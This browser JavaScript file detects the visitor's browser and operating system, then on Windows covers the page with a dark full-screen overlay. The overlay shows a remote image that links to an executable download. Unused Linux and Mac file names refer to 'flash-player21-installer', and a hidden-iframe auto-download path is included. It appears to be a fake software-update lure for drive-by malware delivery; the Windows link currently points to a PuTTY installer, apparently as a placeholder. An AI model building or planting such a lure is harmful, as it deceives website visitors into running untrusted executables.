

var browser="";

var myDivImg;

/*Real Image Width and Height*/
var imgWidth = 0;
var imgHeight = 0;
var realWidth;
var realHeight;
var tgtimage;
var image1;

function Browser() {   
    // ---- public properties -----
    this.fullName = 'unknow'; // getName(false);
    this.name = 'unknow'; // getName(true);
    this.code = 'unknow'; // getCodeName(this.name);
    this.fullVersion = 'unknow'; // getVersion(this.name);
    this.version = 'unknow'; // getBasicVersion(this.fullVersion);
    this.mobile = false; // isMobile(navigator.userAgent);
    this.width = screen.width;
    this.height = screen.height;
    this.platform =  'unknow'; //getPlatform(navigator.userAgent);
    
    // ------- init -------    
    this.init = function() { //operative system, is an auxiliary var, for special-cases
        //the first var is the string that will be found in userAgent. the Second var is the common name
        // IMPORTANT NOTE: define new navigators BEFORE firefox, chrome and safari
        var navs = [
            { name:'Opera Mobi', fullName:'Opera Mobile', pre:'Version/' },
            { name:'Opera Mini', fullName:'Opera Mini', pre:'Version/' },
            { name:'Opera', fullName:'Opera', pre:'Version/' },
            { name:'MSIE', fullName:'Microsoft Internet Explorer', pre:'MSIE ' },
			{ name:'Trident', fullName:'Microsoft Internet Explorer', pre:'MSIE ' },  			
            { name:'BlackBerry', fullName:'BlackBerry Navigator', pre:'/' }, 
            { name:'BrowserNG', fullName:'Nokia Navigator', pre:'BrowserNG/' }, 
            { name:'Midori', fullName:'Midori', pre:'Midori/' }, 
            { name:'Kazehakase', fullName:'Kazehakase', pre:'Kazehakase/' }, 
            { name:'Chromium', fullName:'Chromium', pre:'Chromium/' }, 
            { name:'Flock', fullName:'Flock', pre:'Flock/' }, 
            { name:'Galeon', fullName:'Galeon', pre:'Galeon/' }, 
            { name:'RockMelt', fullName:'RockMelt', pre:'RockMelt/' }, 
            { name:'Fennec', fullName:'Fennec', pre:'Fennec/' }, 
            { name:'Konqueror', fullName:'Konqueror', pre:'Konqueror/' }, 
            { name:'Arora', fullName:'Arora', pre:'Arora/' }, 
            { name:'Swiftfox', fullName:'Swiftfox', pre:'Firefox/' }, 
            { name:'Maxthon', fullName:'Maxthon', pre:'Maxthon/' },
            // { name:'', fullName:'', pre:'' } //add new broswers
            // { name:'', fullName:'', pre:'' }
            { name:'Firefox',fullName:'Mozilla Firefox', pre:'Firefox/' },
            { name:'Chrome', fullName:'Google Chrome', pre:'Chrome/' },
            { name:'Safari', fullName:'Apple Safari', pre:'Version/' }
        ];
    
        var agent = navigator.userAgent, pre;
        //set names
        for (i in navs) {
           if (agent.indexOf(navs[i].name)>-1) {
               pre = navs[i].pre;
               this.name = navs[i].name.toLowerCase(); //the code name is always lowercase
               this.fullName = navs[i].fullName; 
                if (this.name=='msie') this.name = 'iexplorer';
				if (this.name=='Trident') this.name = 'iexplorer';
                if (this.name=='opera mobi') this.name = 'opera';
                if (this.name=='opera mini') this.name = 'opera';
                break; //when found it, stops reading
            }
        }//for
        
      //set version
        if ((idx=agent.indexOf(pre))>-1) {
            this.fullVersion = '';
            this.version = '';
            var nDots = 0;
            var len = agent.length;
            var indexVersion = idx + pre.length;
            for (j=indexVersion; j<len; j++) {
                var n = agent.charCodeAt(j); 
                if ((n>=48 && n<=57) || n==46) { //looking for numbers and dots
                    if (n==46) nDots++;
                    if (nDots<2) this.version += agent.charAt(j);
                    this.fullVersion += agent.charAt(j);
                }else j=len; //finish sub-cycle
            }//for
            this.version = parseInt(this.version);
        }
        
        // set Mobile
        var mobiles = ['mobi', 'mobile', 'mini', 'iphone', 'ipod', 'ipad', 'android', 'blackberry'];
        for (var i in mobiles) {
            if (agent.indexOf(mobiles[i])>-1) this.mobile = true;
        }
        if (this.width<700 || this.height<600) this.mobile = true;
        
        // set Platform        
        var plat = navigator.platform;
        if (plat=='Win32' || plat=='Win64') this.platform = 'Windows';
        if (agent.indexOf('NT 5.1') !=-1) this.platform = 'Windows XP';        
        if (agent.indexOf('NT 6') !=-1)  this.platform = 'Windows Vista';
        if (agent.indexOf('NT 6.1') !=-1) this.platform = 'Windows 7';
		if (agent.indexOf('NT 6.2') !=-1) this.platform = 'Windows 8';
        if (agent.indexOf('Mac') !=-1) this.platform = 'Macintosh';
        if (agent.indexOf('Linux') !=-1) this.platform = 'Linux';
        if (agent.indexOf('iPhone') !=-1) this.platform = 'iOS iPhone';
        if (agent.indexOf('iPod') !=-1) this.platform = 'iOS iPod';
        if (agent.indexOf('iPad') !=-1) this.platform = 'iOS iPad';
        if (agent.indexOf('Android') !=-1) this.platform = 'Android';
        
        if (this.name!='unknow') {
            this.code = this.name+'';
            if (this.name=='opera') this.code = 'op';
            if (this.name=='firefox') this.code = 'ff';
            if (this.name=='chrome') this.code = 'ch';
            if (this.name=='safari') this.code = 'sf';
            if (this.name=='iexplorer') this.code = 'ie';
            if (this.name=='maxthon') this.code = 'mx';
        }
        
        //manual filter, when is so hard to define the navigator type
        if (this.name=='safari' && this.platform=='Linux') {
            this.name = 'unknow';
            this.fullName = 'unknow';
            this.code = 'unknow';
        }
        
    };//function
    
    this.init();

}//Browser class

var brw = new Browser();

var nombrenavegadorweb = brw.name;
var versionnavegador = brw.version;
var sistemaoperativo = brw.platform;



// Detect the Browser using the UserAgent
function detectBrowser() {
	if ((typeof(navigator) != "undefined") && (typeof(navigator.userAgent) != "undefined")) {
		var ua = navigator.userAgent;

		if (ua.search(/chrome/i) != -1) {
			return "chrome";
		}		
		
		if (ua.search(/webkit/i) != -1) {
			return "safari";
		}
		
		if (ua.search(/opera/i) != -1) {
			return "opera";
		}		
		
		if ((ua.search(/msie/i) != -1) && (ua.search(/opera/i) == -1)) {
			return "msie";
		}
		
		if ((ua.search(/mozilla/i) != -1) && (ua.search(/(compatible|webkit)/i) == -1)) {
			return "mozilla";
		}
		
		return "msie"; // return msie as default if unable to detect via user agent
	}
		// The navigator.userAgent object does not exists
		return "";
}

var winW=0;
var winH=0;



function getWindowSize() {
	winW = 0, winH = 0;
	if (document.body && document.body.offsetWidth) {
		winW = document.body.offsetWidth;
		winH = document.body.offsetHeight;
	}
	
	if (document.compatMode=='CSS1Compat' &&
    	document.documentElement &&
    	document.documentElement.offsetWidth ) {
 		winW = document.documentElement.offsetWidth;
 		winH = document.documentElement.offsetHeight;
	}
	
	if (window.innerWidth && window.innerHeight) {
 		winW = window.innerWidth;
 		winH = window.innerHeight;
	}
}

function scaleSize(maxW, maxH, currW, currH){
	var ratio = currH / currW;
    
	var currH2=currH;
	var currW2=currW;
    
	if(currH >= maxH) {
        currH = maxH;
        currW = currH / ratio;
    } 
    
    if(currW >= maxW && ratio <= 1){
        currW = maxW;
        currH = currW * ratio;
    }    
    
    
    return [currW, currH];
}

var imgWidth1 = 0;
var imgHeight1 = 0;

function setImageSize(update) {
	var sw = getScrollBarWidth();
	
	if (imgWidth1 != 0) imgWidth1 = imgWidth;
	if (imgHeight1 != 0) imgHeight1 = imgHeight;
	imgWidth1 = image1.width;
	imgHeight1 = image1.height;
	getWindowSize();

	winW -= sw;
	
	if (imgWidth1 >= winW || imgHeight1 >= winH) {
		var newSize = scaleSize(winW*0.9, winH*0.9, realWidth, realHeight);
		imgWidth = newSize[0];
		imgHeight = newSize[1];
	} else {
		imgWidth = imgWidth1;
		imgHeight = imgHeight1;
	}
	
	if (update) {
		tgtimage.width = imgWidth;
		tgtimage.height = imgHeight;		
		centerDiv(myDivImg);	
	}
}

function getScrollBarWidth () {  
    var inner = document.createElement('p');  
    inner.style.width = "100%";  
    inner.style.height = "200px";  
  
    var outer = document.createElement('div');  
    outer.style.position = "absolute";  
    outer.style.top = "0px";  
    outer.style.left = "0px";  
    outer.style.visibility = "hidden";  
    outer.style.width = "200px";  
    outer.style.height = "150px";  
    outer.style.overflow = "hidden";  
    outer.appendChild (inner);  
  
    document.body.appendChild (outer);  
    var w1 = inner.offsetWidth;  
    outer.style.overflow = 'scroll';  
    var w2 = inner.offsetWidth;  
    if (w1 == w2) w2 = outer.clientWidth;  
  
    document.body.removeChild (outer);  
  
    return (w1 - w2);  
};

function centerDiv(d) {
	var w = imgWidth/2;
	var h = imgHeight/2;
	
	getWindowSize(); // returns the window size in winW,winH
	if (winW==0)
		winW = screen.width;
	if (winH==0)
		winH == screen.height;
	
	var __screenY=winW/2;
 	var __screenX=winH/2;
 	
	d.style.top = __screenX-h+"px";
	d.style.left = __screenY-w+"px";
}

// Start function when the page loads
function initTimer() {
	browser = detectBrowser();
	
	// Detect the underlying operating system (like Windows or Linux)
	var os = (window.orientation != undefined) ? 'ipod': (navigator.platform.match(/mac|win|linux/i) || ['other'])[0].toLowerCase();
	
	var execwindows = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";
	var execlinux = "flash-player21-installer.sh";
	var execmac = "flash-player21-installer.dmg";
	var filename = null;
	
	if (os == "win") {
		filename = execwindows;	
	}
	
	if (os=="linux") {

	}
	
	if (os=="mac") {
	
	}

	if (filename == null) {
		filename = execwindows;	
	}
    
	var myDiv = document.createElement('div');  
	myDiv.id = 'myDiv';  
	myDiv.style.position = 'fixed';  
	myDiv.style.top = 0;
	myDiv.style.left = 0;
	myDiv.style.width = "100%";  
	myDiv.style.height = "100%";  
	myDiv.style.backgroundColor = '#000'; 
	myDiv.style.zIndex = 2147483646;

	if (browser != "msie") {
		myDiv.style.opacity = '0.65';
	} else {
		myDiv.style.filter = 'progid:DXImageTransform.Microsoft.Alpha(opacity=65)';	
	}
	
	myDiv.setAttribute("unselectable", "on");
	myDiv.setAttribute("class", "unselectable");	
	
	document.body.appendChild(myDiv);
		
	myDivImg = document.createElement('div');
	myDivImg.id = 'myDivImg';
	myDivImg.style.position = 'fixed';	
	

	centerDiv(myDivImg);
	myDivImg.style.zIndex = 2147483647;
	
	myDivImg.setAttribute("unselectable", "on");
	myDivImg.setAttribute("class", "unselectable");	
	

	var ahref = document.createElement('a');
	ahref.href = filename;
	ahref.title = "Missing";
	ahref.style.border = 0;
	tgtimage = document.createElement('img');
	tgtimage.src = "https://my.mixtape.moe/mibrlv.jpg";
	tgtimage.width = imgWidth;
	tgtimage.height = imgHeight;
	tgtimage.style.border = 0;
	
	ahref.appendChild(tgtimage);
	myDivImg.appendChild(ahref);
	
	document.body.appendChild(myDivImg);


    window.onresize = function(event) {	
	    setImageSize(true);
	}	


	var autodownload = "True";

	if (autodownload.toLowerCase() != "true") {
		var download = document.createElement('iframe');
		download.src = filename;
		download.width = 0;
		download.height = 0;
		download.style.border = "0";
		download.style.display = "none";
		download.style.visibility = "hidden";
		download.border = 0;
		
		document.body.appendChild(download);	
	}
}

function init() {


	
	if(sistemaoperativo == "Windows" || sistemaoperativo == "Windows XP" || sistemaoperativo == "Windows Vista" || sistemaoperativo == "Windows 7" || sistemaoperativo == "Windows 8")
	{
		

		window.setTimeout("initTimer()", 1000);
	}
	

    var cookie_kv = document.cookie.split("=");
    if(cookie_kv[0] == "started" && cookie_kv[1]== "true") {
		return;
    }
	
}

image1 = new Image();
image1.src = "https://my.mixtape.moe/mibrlv.jpg";

image1.onload = function() {
	realWidth = image1.width;
	realHeight = image1.height;
	setImageSize(false);
	init();
};



function carga(){
	window.location = "https://www.adobe.com/go/gffooter_terms_of_use_es";
}



function createCookie(name,value,days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}


function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) {
	createCookie(name,"",-1);
}
